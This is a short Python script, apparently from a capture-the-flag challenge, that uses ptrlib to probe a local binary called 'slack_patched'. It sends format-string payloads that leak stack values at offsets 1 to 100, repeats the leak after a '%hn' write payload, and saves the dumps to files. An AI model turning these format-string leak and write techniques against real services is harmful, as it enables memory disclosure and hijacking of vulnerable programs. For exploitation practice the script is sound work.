#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./slack_patched")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    dump = ""
    dump2 = ""
    for i in range(100):
        io = connect()
        payload = f"#%{i+1}$lx#".encode()
        io.sendline(payload)
        io.recvuntil(b"#")
        leak = io.recvline().strip(b"#").decode()
        dump += f"{i + 1}: {leak}\n"
        io.close()

    for i in range(100):
        io = connect()
        payload = f"%56795c%25$hn".encode()
        io.sendline(payload)
        payload = f"#%{i+1}$lx#".encode()
        io.sendline(payload)
        io.recvuntil(b"#")
        leak = io.recvline().strip(b"#").decode()
        dump2 += f"{i + 1}: {leak}\n"
        io.close()

    with open("dump2.txt", "w") as f:
        f.write(dump2)

    with open("dump.txt", "w") as f:
        f.write(dump)


if __name__ == "__main__":
    main()
